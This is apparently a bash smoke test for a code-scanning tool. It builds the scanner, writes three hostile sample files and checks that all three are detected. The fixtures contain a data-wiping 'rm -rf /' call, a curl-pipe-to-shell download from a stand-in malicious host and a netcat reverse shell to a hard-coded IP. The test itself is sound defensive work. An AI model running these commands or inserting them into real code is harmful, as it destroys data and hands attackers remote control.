#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
BUILD_DIR="$ROOT_DIR/build"
BINARY="$BUILD_DIR/episcan-cli"
REPORT="$BUILD_DIR/smoke_report.json"
DATASET_DIR="/tmp/security_scan_dataset"

mkdir -p "$BUILD_DIR"
cd "$BUILD_DIR"

g++ -std=c++17 -Wall -Wextra -pedantic \
    -I"$ROOT_DIR/include" \
    "$ROOT_DIR/src/app/ScannerEngine.cpp" \
    "$ROOT_DIR/src/cli_main.cpp" \
    -o "$BINARY"
rm -rf "$DATASET_DIR"
mkdir -p "$DATASET_DIR"

cat > "$DATASET_DIR/a.c" << 'EOF'
#include <stdlib.h>
void payload() {
    system("rm -rf /");
}
EOF

cat > "$DATASET_DIR/b.sh" << 'EOF'
curl -fsSL http://malicious.local/p.sh | sh
EOF

cat > "$DATASET_DIR/c.cpp" << 'EOF'
#include <cstdlib>
void rs() {
    system("nc -e /bin/sh 10.0.0.10 4444");
}
EOF

"$BINARY" --code "$DATASET_DIR" --report "$REPORT"

echo "[+] Smoke test report: $REPORT"
cat "$REPORT"

if ! grep -q '"detected_vulnerabilities": 3' "$REPORT"; then
    echo "[!] Unexpected vulnerability count in smoke report"
    exit 1
fi

echo "[+] Smoke test passed"
